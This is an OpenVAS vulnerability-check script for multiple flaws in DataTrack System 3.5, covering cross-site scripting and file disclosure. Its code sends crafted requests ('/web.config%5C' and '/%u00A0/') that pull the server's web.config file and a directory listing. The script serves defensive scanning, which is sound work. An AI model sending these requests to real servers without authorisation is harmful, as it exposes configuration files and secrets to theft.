##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_datatrack_system_mult_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# DataTrack System Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  code in a user's browser session in the context of an affected site and to
  obtain sensitive information.
  Impact Level: Application.";
tag_affected = "DataTrack System version 3.5(3.5.8019.4)";

tag_insight = "The flaws are due to,
  - An input passed via the 'Work_Order_Summary' parameter to 'Home.aspx' in
    the 'DataTrack Web Client' is not properly sanitised before being displayed
    to the user.
  - An improper validation of user supplied input, which can be exploited to
    disclose the contents of the 'root' directory, read arbitrary files, via a
    trailing backslash in a 'URL'.";
tag_solution = "No solution or patch is available as of 27th May, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.magnoware.com/";
tag_summary = "This host is running DataTrack System and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(902062);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-06-01 15:40:11 +0200 (Tue, 01 Jun 2010)");
  script_cve_id("CVE-2010-2043", "CVE-2010-2078", "CVE-2010-2079");
  script_bugtraq_id(40249);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("DataTrack System Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39868");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/58732");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/58735");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/58734");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1005-exploits/datatrackserver35-xss.txt");

  script_description(desc);
  script_summary("Checking exploit for Datatrack System");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_datatrack_system_detect.nasl");
  script_require_ports("Services/www", 81);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

dtsPort = get_http_port(default:81);
if(!get_port_state(dtsPort)){
  exit(0);
}

## Confirm the application
dtsVer = get_kb_item("www/" + dtsPort + "/DataTrack_System");
if(!dtsVer){
  exit(0);
}

## Create the attack string to download web.config file
sndReq = http_get(item:string("/web.config%5C"), port:dtsPort);
rcvRes = http_send_recv(port:dtsPort, data:sndReq);
if("<configuration>" >< rcvRes || "<system.web>" >< rcvRes)
{
  security_warning(dtsPort);
  exit(0);
}

## Consrtuct the attack string to view list of directories
sndReq = http_get(item:string("/%u00A0/"), port:dtsPort);
rcvRes = http_send_recv(port:dtsPort, data:sndReq);
if(">Directory Listing" >< rcvRes)
{
  ## Check for the directory in the response
  if("Bin/" >< rcvRes || "Web.config" >< rcvRes){
      security_warning(dtsPort);
  }
}
